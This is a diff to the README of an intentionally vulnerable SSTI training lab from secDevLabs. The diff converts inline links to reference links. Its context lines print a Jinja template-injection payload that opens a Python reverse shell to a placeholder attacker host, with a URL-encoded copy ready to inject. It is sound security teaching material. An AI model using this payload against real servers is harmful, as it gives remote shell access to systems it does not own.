@@ -21,7 +21,7 @@ The main goal of this project is to discuss how **Server-Side Template Injection
 
 ## Setup
 
-To start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
+To start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs][secDevLabs], you must type the following commands to start:
 
 ```sh
 cd secDevLabs/owasp-top10-2021-apps/a3/sstype
@@ -127,7 +127,7 @@ Don't forget to replace `ATTACKER-IP` and `ATTACKER-PORT` below!
 {%import os%}{{os.popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER-IP\",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'").read()}}
 ```
 
-However, as there might be some special characters in this string, we need to escape them before injecting it in the vulnerable application (this [online URL encoder](https://www.urlencoder.org/) may help) and hope for a shell:
+However, as there might be some special characters in this string, we need to escape them before injecting it in the vulnerable application (this [online URL encoder][online URL encoder] may help) and hope for a shell:
 
 ```python
 %7B%25import%20os%25%7D%7B%7Bos.popen%28%22python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ATTACKER-IP%5C%22%2CATTACKER-PORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22%2Fbin%2Fbash%5C%22%2C%5C%22-i%5C%22%5D%29%3B%27%22%29.read%28%29%7D%7D
@@ -147,6 +147,8 @@ How could you now mitigate this vulnerability? After your code modification, an 
 
 We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉
 
+[secDevLabs]: https://github.com/globocom/secDevLabs
 [docker install]: https://docs.docker.com/install/
 [docker compose install]: https://docs.docker.com/compose/install/
 [app]: http://localhost:10001
+[online URL encoder]: https://www.urlencoder.org/
